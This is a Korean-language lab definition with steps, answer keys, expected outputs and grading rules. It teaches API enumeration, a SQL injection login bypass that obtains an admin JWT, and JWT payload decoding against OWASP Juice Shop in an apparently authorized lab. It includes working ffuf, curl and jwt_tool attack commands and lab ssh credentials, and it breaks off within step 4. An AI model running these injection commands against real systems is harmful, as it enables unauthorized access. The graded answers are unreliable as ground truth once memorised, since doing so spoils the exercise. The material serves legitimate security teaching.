lab_id: standalone-attack-week03
title: "웹앱 구조·API·JWT 공격 vs API 남용 탐지"
version: standalone-attack
course: attack
week: 3
description: |
  현대 웹앱은 사실상 API 다. OWASP Juice Shop(juice.el34.lab)은 화면을 그리는 JS 프론트엔드가 REST
  API(/rest/*)를 호출하고 JWT 토큰으로 인증 상태를 유지하는 현대 웹앱이다. 따라서 공격 표면이 화면의
  폼이 아니라 API 엔드포인트와 토큰으로 옮겨갔다. 본 lab 은 그 표면을 한 사이클로 공격한다 —
  ① REST API 엔드포인트 열거(ffuf 로 /rest/* 매핑), ② 로그인 API 에 SQL Injection(' OR 1=1--)을 넣어
  인증을 우회하고 admin 권한 JWT 획득(OWASP A07 인증 실패), ③ 획득한 JWT 의 payload 를 base64url
  디코드해 서명 검증 없이 내부 정보(email 등)가 노출됨을 확인, ④ 이 공격들이 방어층(ModSecurity 942
  SQLi 룰군)에 어떻게 남는지 추적. 공격은 내 공격 VM ssh att@192.168.0.202(출처 IP 192.168.0.202)에서, 대상은
  juice.el34.lab 이다. juice vhost 는 DetectionOnly 모드라 SQLi 가 200 으로 통과(공격 성공)하지만
  탐지는 로그에 기록된다 — 그래서 공격을 성공시키면서 방어 가시성도 함께 학습한다. 인가된 실습
  환경에서만 수행한다. 공격은 내 공격 VM `ssh att@192.168.0.202`(비번 1)에서 자연 URL
  (`http://juice.el34.lab/...`)로, 방어 흔적은 WAF 장비 `ssh ccc@10.20.32.80`(비번 1)에서 확인한다.
difficulty: hard
duration_minutes: 180
prerequisites:
  - "W01–W02 통과"
  - "공격 VM ssh att@192.168.0.202 + 방어 WAF 장비 ssh ccc@10.20.32.80 (비번 1)"
  - "lecture §2(API) §3(JWT) §4(인증우회) 숙지"
objectives:
  - "현대 웹(JS 프론트 + REST API + JWT)의 공격 표면이 엔드포인트와 토큰으로 이동했음을 이해한다"
  - "ffuf 로 juice.el34.lab 의 REST API 엔드포인트(/rest/*)를 열거해 공격 표면을 매핑한다"
  - "로그인 API 에 SQL Injection(' OR 1=1--)을 넣어 인증을 우회하고 admin JWT 를 획득한다(OWASP A07)"
  - "JWT 를 header.payload.signature 로 분해하고 payload 를 base64url 디코드해 내용 노출을 확인한다"
  - "JWT 4 약점(payload 노출·alg:none·약한 키·검증 부실)을 방어책과 짝지어 설명한다"
  - "로그인 SQLi 가 ModSecurity 942 룰군에 탐지됨을 추적해 공격자의 자기 가시성을 익힌다"
pass_threshold: 0.7
steps:

  - order: 1
    instruction: |
      ## 🎯 목표
      공격 대상 juiceshop 의 REST API 가 살아 있는지 확인한다. 모든 공격은 대상 도달성(reachability)
      확인에서 시작한다 — API 가 응답하지 않으면 그 뒤 모든 단계가 무의미하기 때문이다.

      ## 💡 개념 한 줄
      OWASP Juice Shop 은 화면을 그리는 JS 프론트엔드가 REST API(/rest/*)를 호출해 JSON 을 받아오는
      현대 웹앱이다. 즉 공격 표면이 화면의 폼이 아니라 API 엔드포인트로 옮겨가 있다(강의 §1).

      ## 💻 실행 명령 (한 줄씩 따라 실행)

      **공격 VM:** `ssh att@192.168.0.202`(비번 1) — `ssh att@192.168.0.202 (비번 1)` 로 접속해 실행한다.

      ```bash
      # 1) 대상 앱 지문 — whatweb 으로 juice 가 살아있고 현대 JS/API 앱(OWASP Juice Shop)인지 식별
      whatweb -a1 http://juice.el34.lab/
      ```
      > 💡 **브라우저로도 동일:** 학생 PC 브라우저에서 `http://juice.el34.lab/` 를 열면 Juice Shop SPA 가
      > 뜬다. whatweb 은 응답을 지문해 서버(Apache) + `Script[module]`(ES module = 현대 JS 프론트) +
      > `Title[OWASP Juice Shop]` 을 한 줄로 식별한다 — 화면의 폼이 아니라 REST API 가 이 앱의 표면이라는 신호다.
      > (엔드포인트 자체의 열거는 step 2 에서 ffuf 로 한다.)

      - `whatweb -a1`(강도 1 지문), `Script[module]`+`HTML5`=JS 프론트가 REST API 를 호출하는 현대 웹앱, `Title[OWASP Juice Shop]`=대상 확정.

      ## ✅ 합격 기준
      `Juice Shop` 출력 시 통과. **근거:** whatweb 이 OWASP Juice Shop + JS 모듈 앱을 식별하면 대상이 살아
      있고 API 기반 현대 웹앱임을 확인 — 공격 표면이 폼이 아니라 엔드포인트·토큰으로 이동했음을 뜻한다.
    hint: 'whatweb 로 juice(OWASP Juice Shop) 지문'
    category: survey
    points: 10
    answer: |
      # 1) 대상 앱 지문 — whatweb 으로 juice 가 살아있고 현대 JS/API 앱인지 식별
      ssh att@192.168.0.202 'whatweb -a1 http://juice.el34.lab/'
    answer_detail: "juiceshop 은 현대 웹앱(REST API + JWT 인증)이다. whatweb 지문에 Title[OWASP Juice Shop] + Script[module](ES 모듈=현대 JS 프론트) + HTML5 가 보이면 이 앱이 API 기반이라는 증거 — 공격 표면이 화면의 폼이 아니라 엔드포인트와 토큰으로 이동했음을 뜻한다. 엔드포인트 열거는 step 2 의 ffuf 가 담당. 채점은 응답에 Juice Shop 이 포함되는지로 판정한다."
    expected_output: |
      http://juice.el34.lab/ [200 OK] Apache[2.4.52], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.0.161], Script[module], Title[OWASP Juice Shop], X-Frame-Options[SAMEORIGIN]
    verify:
      type: output_contains
      expect: 'Juice Shop'
      field: stdout
      semantic:
        intent: "juiceshop 앱 지문(API 기반 현대 웹앱 확인)"
        success_criteria: ["whatweb 로 OWASP Juice Shop 식별"]
        acceptable_methods: ["**[OSS] whatweb 지문 (권장)**"]
    target_vm: web

  - order: 2
    instruction: |
      ## 🎯 목표
      juiceshop 의 REST API 엔드포인트(/rest/*)를 열거해 공격 표면 지도를 그린다. 정상 화면에는
      드러나지 않는 "보이지 않는 문"(관리자용·미완성 기능 등)을 찾는 것이 핵심이다.

      ## 💡 개념 한 줄
      JS 프론트엔드는 화면을 채우려 수많은 API 를 호출한다. 표면을 넓게 매핑할수록 익스플로잇 기회가
      늘어난다 — 그래서 공격자는 후보 경로를 자동으로 던져보는 fuzzing 으로 엔드포인트를 열거한다.

      ## 💻 실행 명령 (한 줄씩 따라 실행)

      **공격 VM:** `ssh att@192.168.0.202`(비번 1) — `ssh att@192.168.0.202 (비번 1)` 로 접속해 실행한다.

      ```bash
      # 1) /rest/* 후보 경로 워드리스트 생성
      printf "products\nuser\nFeedbacks\nBasketItems\nadmin\nproducts/search\n" > /tmp/aw3.txt
      # 2) ffuf로 /rest/FUZZ 열거 — 200(공개)/401(인증필요)/500(오류)인 실재 엔드포인트만
      ffuf -u http://juice.el34.lab/rest/FUZZ -w /tmp/aw3.txt -mc 200,401,500 -s 2>&1 | head -10
      # 3) 워드리스트 정리(self-clean)
      rm -f /tmp/aw3.txt
      ```
      출력된 각 경로가 살아 있는 엔드포인트이자 공격 지점이다 — 200(공개)·401(인증 필요)·500(존재하나 오류).
      이렇게 짧은 시간에 여러 경로를 던지는 요청은 IDS/WAF 에 스캐너성 행위로 탐지된다(W02 의 은밀 vs 정보량 trade-off).
      - `-u .../rest/FUZZ`(FUZZ 자리에 단어 대입), `-mc 200,401,500`(이 코드만 존재로 표시). **401 = 존재하지만 인증 필요 = 다음 표적.**

      ## ✅ 합격 기준
      `user` 출력 시 통과. **근거:** /rest/* 엔드포인트(user 등)가 발견되면 통과 — 각 엔드포인트가 공격
      지점이며, 다량 요청은 IDS/WAF 에 스캐너성으로 탐지된다(W02 trade-off).
    hint: 'ffuf /rest/FUZZ'
    category: recon
    points: 12
    answer: |
      # 1) /rest/* 후보 경로 워드리스트 생성
      ssh att@192.168.0.202 'printf "products\nuser\nFeedbacks\nBasketItems\nadmin\nproducts/search\n" > /tmp/aw3.txt'
      # 2) ffuf로 /rest/FUZZ 열거 — 200(공개)/401(인증필요)/500(오류)인 실재 엔드포인트만
      ssh att@192.168.0.202 "ffuf -u http://juice.el34.lab/rest/FUZZ -w /tmp/aw3.txt -mc 200,401,500 -s" 2>&1 | head -10
      # 3) 워드리스트 정리(self-clean)
      ssh att@192.168.0.202 rm -f /tmp/aw3.txt
    answer_detail: "API 열거는 ffuf 로 /rest/* 경로를 매핑하는 작업이다. 200(공개)·401(인증 필요)·500(존재하나 오류)이 나온 경로는 모두 실재하는 엔드포인트이며 각각이 공격 지점이다. JS 앱은 수많은 API 를 부르므로 표면이 넓고, 그만큼 익스플로잇 기회가 많다. 단 다량 요청이라 IDS/WAF 에 스캐너성으로 탐지된다(W02 의 은밀함 vs 정보량 trade-off). 채점은 출력에 user 가 포함되는지로 판정한다."
    expected_output: |
      user
      BasketItems
      Feedbacks
      products
      admin
      products/search
    verify:
      type: output_contains
      expect: 'user'
      field: stdout
      semantic:
        intent: "API 엔드포인트 열거"
        success_criteria: ["/rest/* 엔드포인트 발견"]
        acceptable_methods: ["**[OSS] ffuf /rest/FUZZ (권장)**"]
    target_vm: web

  - order: 3
    instruction: |
      ## 🎯 목표
      로그인 API 에 SQL Injection 을 넣어 인증을 우회하고, 정상 자격 없이 admin 권한 JWT 를 획득한다.
      이것이 OWASP Top 10 의 A07(Identification & Authentication Failures, 인증 실패)이다.

      ## 💡 개념 한 줄
      Juice Shop 로그인은 입력 email 을 그대로 SQL 문에 이어 붙인다(교육용 취약점). email 칸에
      `' OR 1=1--` 를 넣으면 질의의 WHERE 절이 항상 참이 되고 비밀번호 비교는 주석(--) 처리되어,
      모든 사용자 중 첫 행(admin)으로 로그인된다(강의 §4).

      ## 💻 실행 명령 (한 줄씩 따라 실행)

      **공격 VM:** `ssh att@192.168.0.202`(비번 1) — `ssh att@192.168.0.202 (비번 1)` 로 접속해 실행한다.

      ```bash
      # 1) SQLi 페이로드 JSON을 base64 디코드로 안전히 준비({"email":"' OR 1=1--","password":"x"})
      echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/sqli.json
      # 2) 로그인 API에 SQLi JSON 전송 — authentication.token(admin JWT) 반환 확인
      curl -s -H 'Content-Type: application/json' -d @/tmp/sqli.json http://juice.el34.lab/rest/user/login | head -c 150  # curl-ok: SQLi 로그인 우회→admin JWT (스캐너 대체불가 크래프티드 익스플로잇)
      # 3) 페이로드 파일 정리(self-clean)
      rm -f /tmp/sqli.json
      ```
      > 💡 **Burp/Postman 으로도 동일:** 이 요청은 POST + JSON 본문이라 브라우저 주소창으론 못 보낸다 —
      > 실무자는 **Burp Repeater** 나 **Postman** 에 `POST http://juice.el34.lab/rest/user/login`,
      > 헤더 `Content-Type: application/json`, 본문 `{"email":"' OR 1=1--","password":"x"}` 를 넣고
      > Send 해 응답의 `authentication.token` 을 눈으로 확인한다(curl `-s` 와 같은 요청, 더 직관적).

      응답에 `authentication.token`(admin JWT)이 오면 인증 우회 성공이다 — 정상 로그인 실패는 401 이 온다.
      - `' OR 1=1--` = `'`(문자열 조기 종료) + `OR 1=1`(조건 항상 참) + `--`(이후 SQL 주석). base64 로 전달해 셸 인용 충돌을 피한다. `-d @파일`(파일 내용을 요청 본문으로).

      ## ✅ 합격 기준
      `authentication` 출력 시 통과. **근거:** 응답에 authentication.token(JWT)이 오면 우회 성공(정상
      로그인 실패는 401) — admin 권한 토큰 획득(OWASP A07). 근본 방어는 파라미터화 질의.
    hint: '로그인 SQLi → authentication.token'
    category: manipulation
    points: 16
    answer: |
      # 1) SQLi 페이로드 JSON을 base64 디코드로 안전히 준비({"email":"' OR 1=1--","password":"x"})
      ssh att@192.168.0.202 'echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/sqli.json'
      # 2) 로그인 API에 SQLi JSON 전송 — authentication.token(admin JWT) 반환 확인
      ssh att@192.168.0.202 "curl -s -H 'Content-Type: application/json' -d @/tmp/sqli.json http://juice.el34.lab/rest/user/login | head -c 150"  # curl-ok: SQLi 로그인 우회→admin JWT (스캐너 대체불가 크래프티드 익스플로잇)
      # 3) 페이로드 파일 정리(self-clean)
      ssh att@192.168.0.202 rm -f /tmp/sqli.json
    answer_detail: "로그인 email 에 넣은 ' OR 1=1-- 가 인증 질의의 WHERE 절을 항상 참으로 만들고 비밀번호 비교를 주석(--)으로 무력화해, 모든 사용자 중 첫 행(admin)으로 로그인된다 → 응답에 admin 권한 JWT(authentication.token)가 발급된다. 정상 로그인 실패는 401, 우회 성공은 token 반환으로 구분된다. 이것이 OWASP A07(Identification & Authentication Failures, 인증 실패)다. 근본 방어는 파라미터화 질의(prepared statement). 채점은 응답에 authentication 이 포함되는지로 판정한다."
    expected_output: |
      {"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQ
    verify:
      type: output_contains
      expect: 'authentication'
      field: stdout
      semantic:
        intent: "로그인 SQLi 인증 우회 + JWT 획득"
        success_criteria: ["SQLi 우회 성공", "authentication.token 획득"]
        acceptable_methods: ["**[OSS] 로그인 SQLi → token (권장)**"]
    target_vm: web

  - order: 4
    instruction: |
      ## 🎯 목표
      앞서 획득한 JWT 의 payload(가운데 부분)를 디코드해, 서명 검증 없이 누구나 내부 정보(email 등)를
      읽을 수 있음을 직접 확인한다.

      ## 💡 개념 한 줄
      JWT 는 header.payload.signature(base64url) 구조다. **base64url 은 암호화가 아니라 인코딩** —
      서명(봉인)은 변조만 막을 뿐 내용을 가리지 못한다. 그래서 payload 는 토큰을 손에 넣은 누구나
      디코드해 읽는다(강의 §0.1, §3).

      ## 💻 실행 명령 (한 줄씩 따라 실행)

      **공격 VM:** `ssh att@192.168.0.202`(비번 1) — `ssh att@192.168.0.202 (비번 1)` 로 접속해 실행한다.

      ```bash
      # 1) SQLi로 토큰 획득 → JWT payload(2번째 부분) base64url 디코드해 평문 노출 확인(세 줄을 차례로)
      echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/s.json
      T=$(curl -s -H "Content-Type: application/json" -d @/tmp/s.json http://juice.el34.lab/rest/user/login | sed -E 's/.*"token":"([^"]+)".*/\1/')  # curl-ok: SQLi 로그인 우회→admin JWT (스캐너 대체불가 크래프티드 익스플로잇)
      echo "$T" | cut -d. -f2 | tr "_-" "/+" | base64 -d 2>/dev/null | head -c 300; echo
      # 2) 같은 일을 전문 도구로 — jwt_tool 이 header/payload 를 필드별로 구조화·해석(alg·iat 발급시각까지)
      jwt_tool "$T" 2>/dev/null | sed -r 's/\x1b\[[0-9;]*m//g' | grep -iE 'Token (header|payload)|typ|alg|email|role|iat'
      rm -f /tmp/s.json
      ```
